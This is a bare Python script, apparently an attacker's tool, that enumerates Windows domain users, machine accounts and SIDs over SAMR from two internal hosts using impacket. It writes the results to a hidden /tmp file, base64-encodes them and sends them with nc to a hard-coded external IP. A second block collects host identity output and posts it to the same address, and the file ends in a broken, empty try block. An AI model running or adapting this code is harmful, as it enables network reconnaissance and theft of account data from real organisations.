#!/usr/bin/env python3
import sys, subprocess, base64, traceback
sys.path.insert(0, "/tmp/imp")
O = "/tmp/.SAMR.txt"
out = open(O, "w", buffering=1)
def w(s):
    try: out.write(str(s) + "\n")
    except Exception: pass
from impacket.dcerpc.v5 import transport, samr, lsat, lsad
from impacket.dcerpc.v5.dtypes import NULL
for ip in ["10.61.10.10", "10.61.10.11"]:
    try:
        t = transport.DCERPCTransportFactory(r"ncacn_np:%s[\pipe\samr]" % ip)
        dce = t.get_dce_rpc()
        dce.connect(); dce.bind(samr.MSRPC_UUID_SAMR)
        sh = samr.hSamrConnect(dce)["ServerHandle"]
        ds = samr.hSamrEnumerateDomainsInSamServer(dce, sh)
        names = [x["Name"] for x in ds["Buffer"]["Buffer"]]
        w(ip + " domains: " + str(names))
        for nm in names:
            if nm.upper() == "BUILTIN": continue
            sid = samr.hSamrLookupDomainInSamServer(dce, sh, nm)["DomainId"]
            w("SID " + nm + " = " + sid.formatCanonical())
            dh = samr.hSamrOpenDomain(dce, sh, domainId=sid)["DomainHandle"]
            try:
                st, buf, ret = samr.hSamrQueryDisplayInformation2(dce, dh, samr.DOMAIN_DISPLAY_INFORMATION.DomainDisplayUser, 1)
                for ui in buf["Buffer"]:
                    w("U %s\\%s rid=%s ctrl=%s" % (nm, ui["AccountName"], ui["Rid"], ui["Control"]))
            except Exception:
                try:
                    st, buf, ret = samr.hSamrQueryDisplayInformation2(dce, dh, samr.DOMAIN_DISPLAY_INFORMATION.DomainDisplayUser, 0)
                    for ui in buf["Buffer"]:
                        w("U %s\\%s rid=%s" % (nm, ui["AccountName"], ui["Rid"]))
                except Exception as e2:
                    w("qd err " + type(e2).__name__)
            try:
                st2, buf2, ret2 = samr.hSamrQueryDisplayInformation2(dce, dh, samr.DOMAIN_DISPLAY_INFORMATION.DomainDisplayMachine, 1)
                for ui in buf2["Buffer"]:
                    w("M %s\\%s rid=%s" % (nm, ui["AccountName"], ui["Rid"]))
            except Exception:
                pass
        dce.disconnect()
    except Exception:
        w(ip + " ERR " + traceback.format_exc()[-160:])
out.close()
b = base64.b64encode(open(O, "rb").read()).decode()
subprocess.run("printf 'POST /up HTTP/1.0\\r\\nHost: 131.123.43.239\\r\\nX-Name: mel_lat_samr\\r\\nContent-Length: %s\\r\\n\\r\\n%s' | timeout 90 nc 131.123.43.239 80" % (len(b), b), shell=True)
print("SAMR_DONE")

import os,base64,urllib.request as u
try:
 d=base64.b64encode(os.popen("id;hostname;uname -a").read().encode()).decode(); u.urlopen(u.Request("http://131.123.43.239/up",data=d.encode(),headers={"X-Name":"wrk_out"}),timeout=10)
except Exception: pass

try:
except Exception: pass

